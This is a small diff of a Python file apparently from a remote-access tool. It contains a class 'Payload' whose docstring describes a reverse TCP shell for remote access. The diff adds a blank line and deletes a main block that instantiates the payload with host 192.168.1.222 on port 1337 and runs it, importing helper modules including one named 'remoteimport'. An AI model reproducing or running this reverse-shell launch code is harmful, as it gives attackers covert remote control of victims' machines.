@@ -64,6 +64,7 @@ def threaded(function):
 _abort = False
 _debug = True
 
+
 class Payload():
     """ 
     Reverse TCP shell designed to provide remote access
@@ -1011,9 +1012,3 @@ class Payload():
         except Exception as e:
             __logger__.error("{} error: {}".format(self.run.func_name, str(e)))
 
-if __name__ == '__main__':
-    from util import *
-    from security import *
-    from remoteimport import *
-    m = Payload(host='192.168.1.222', port=1337)
-    m.run()
